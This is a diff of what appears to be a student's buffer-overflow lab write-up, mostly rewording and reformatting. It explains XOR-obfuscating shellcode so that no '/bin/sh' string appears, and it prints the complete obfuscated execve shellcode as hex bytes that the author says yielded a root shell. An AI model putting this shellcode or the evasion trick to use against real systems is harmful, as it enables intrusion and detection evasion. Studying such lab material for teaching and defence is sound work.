@@ -111,14 +111,14 @@ Non-executable stack prevents the exploit in Task 1 because it prevents the exec
 
 ### Shellcode with no "/bin/sh" string hardcoded
 
-One way of obfuscating shellcode so that there is no hardcoded "/bin/sh" string is to perform some arithmetic or logical operations on the string, use the resulting string in the shellcode and add some instructions to the shellcode to reverse the arithmetic or logical operations that was performed on the string.
+One way of obfuscating shellcode so that there is no hardcoded `"/bin/sh"` string is to perform some arithmetic or logical operations on the string, use the resulting string in the shellcode and add some instructions to the shellcode to reverse the arithmetic or logical operations that was performed on the string.
 
-In order words, I replaced the following instructions, that pushes the hardcoded strings onto the stack, in the original shellcode:
+In order words, I replaced the following assembly instructions, that pushes the hardcoded strings onto the stack, in the original shellcode:
 ```
 pushl   $0x68732f2f
 pushl   $0x6e69622f            
 ```
-With the following instructions:
+With the following assembly instructions:
 ```
 movl <"//sh" after operation 1>,%edx
 perform inverse of operation 1 on %edx
@@ -127,12 +127,12 @@ movl <"//sh" after operation 2>,%edx
 perform inverse of operation 2 on %edx
 pushl %edx
 ```
-Firstly, the resulting string after performing some operations is moved into a register. Subsequently, the inverse of the operations are performed on the register. As a result, the register now contains the actual string that I need so I pushed the register onto the stack.
+Firstly, the resulting string obtained after performing some operations is moved into a register. Subsequently, the inverse of the operations are performed on the register. As a result, the register now contains the actual string that I need so I pushed the register onto the stack.
 
-(Multiple operations could have been performed the strings and reversed in the subsequent instructions in the shellcode. For the sake of brevity, I only used one operation in the illustration.)
+(Multiple operations could have been performed on each of the strings and reversed in the subsequent instructions in the shellcode. For the sake of brevity, I only showed one operation in the illustration.)
 
 ### Obfuscated shellcode
-For my obfuscated shellcode, I chose to use the XOR operation on both of hardcoded strings. The following table show the bitmask I used and the results of the XOR:
+For my obfuscated shellcode, I chose to use the XOR operation on both of hardcoded strings. The following table show the bitmask that I used and the results of the XOR:
 
 | String        | Hex Representation | Bitmask  | Result |
 | ------------- |-------------|---------|---------|
@@ -149,21 +149,23 @@ xorl    $0xbebebebe, %edx
 pushl   %edx					  
 ```
 
-To obtain the hex representation of these instructions, I wrote a short program consisting of the above instructions by using `__asm__`. I compiled the program and retrieved the hex representation of the instructions from the `objdump` of the compiled program. The code of this program can be found in *asm.c*.
+To obtain the hex representation of these instructions, I wrote a short program consisting of the above instructions by using `__asm__()`. I compiled the program and retrieved the hex representation of the instructions from the `objdump -d` of the compiled program. The code of this program and the results of its `objdump` the can be found in *asm.c* and *asm.txt* respectively.
 
 After replacing the appropriate portions of the shellcode with the instructions that I wrote, the final shellcode that I used was:
+<br>
+
 ```
-"\x31\xc0"             		/* xorl    %eax,%eax              */
-"\x50"                 		/* pushl   %eax                   */
-"\xba\x91\x91\xcd\xd6" 		/* movl    $0xd6cd9191, %edx      */
+"\x31\xc0"                  /* xorl    %eax,%eax              */
+"\x50"                      /* pushl   %eax                   */
+"\xba\x91\x91\xcd\xd6"      /* movl    $0xd6cd9191, %edx      */
 "\x81\xf2\xbe\xbe\xbe\xbe"  /* xorl    $0xbebebebe, %edx      */
-"\x52"						/* pushl   %edx					  */
-"\xba\x91\xdc\xd7\xd0"		/* movl    $0xd0d7dc91, %edx	  */
+"\x52"                      /* pushl   %edx                   */
+"\xba\x91\xdc\xd7\xd0"      /* movl    $0xd0d7dc91, %edx	  */
 "\x81\xf2\xbe\xbe\xbe\xbe"  /* xorl    $0xbebebebe, %edx      */
-"\x52"						/* pushl   %edx					  */
-"\x89\xe3"            		/* movl    %esp,%ebx              */
-"\x50"                	    /* pushl   %eax                   */
-"\x53"                	    /* pushl   %ebx                   */
+"\x52"                      /* pushl   %edx                   */
+"\x89\xe3"                  /* movl    %esp,%ebx              */
+"\x50"                      /* pushl   %eax                   */
+"\x53"                      /* pushl   %ebx                   */
 "\x89\xe1"                  /* movl    %esp,%ecx              */
 "\x99"                      /* cdql                           */
 "\xb0\x0b"                  /* movb    $0x0b,%al              */
@@ -176,4 +178,4 @@ Using the above obfuscated shellcode that has no hardcoded `"/bin/sh"`, I was ab
 
 *Figure.9 Screenshot of root shell obtained using obfuscated shellcode*
 
-The code that I used for this task can be found in *obfuscated_exploit.c*.
+The code that I used for the exploit in this task can be found in *obfuscated_exploit.c*.
